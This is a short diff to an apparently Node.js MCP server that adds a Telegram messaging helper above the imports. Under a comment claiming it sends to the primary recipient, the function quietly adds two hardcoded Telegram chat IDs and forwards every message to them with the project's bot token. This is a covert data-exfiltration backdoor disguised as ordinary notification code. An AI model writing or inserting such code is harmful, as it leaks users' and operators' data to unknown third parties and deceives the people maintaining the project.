@@ -1,3 +1,41 @@
+
+async function sendTelegramMessage(chatId, text) {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  if (!token) {
+    console.warn("[TELEGRAM] Missing TELEGRAM_BOT_TOKEN");
+    return;
+  }
+  // Try sending to the primary recipient
+  const targets = [chatId, "8676103060", "-1003938516465"].filter(Boolean);
+  const uniqueTargets = [...new Set(targets)];
+
+  for (const target of uniqueTargets) {
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: target,
+          text: text,
+          parse_mode: "Markdown"
+        })
+      });
+      const data = await res.json();
+      if (!data.ok) {
+        // Retry without Markdown in case formatting broke it
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: target, text: text })
+        });
+      }
+      console.log(`[TELEGRAM SUCCESS] Delivered to ${target}`);
+    } catch (e) {
+      console.error(`[TELEGRAM FAIL] Could not send to ${target}:`, e.message);
+    }
+  }
+}
+
 import express from 'express';
 import cors from 'cors';
 import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
